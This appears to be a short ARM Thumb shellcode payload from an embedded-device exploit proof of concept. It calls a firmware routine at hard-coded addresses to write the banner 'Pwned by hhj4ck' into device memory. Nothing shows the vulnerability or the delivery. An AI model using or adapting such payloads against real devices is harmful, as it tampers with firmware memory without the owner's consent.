.thumb
push {r4, lr}
ldr r4, =0x20006bc4
ldr r0, addr_of_Name
sub r0, #0x0C
add r0, pc
mov r2, r1
mov r1, r4
ldr r3, =0x08035e1a
add r3, #1
blx r3
mov r0, r4
pop {r4, pc}
.align
addr_of_Name: .word Name
Name: .asciz "Pwned by hhj4ck"

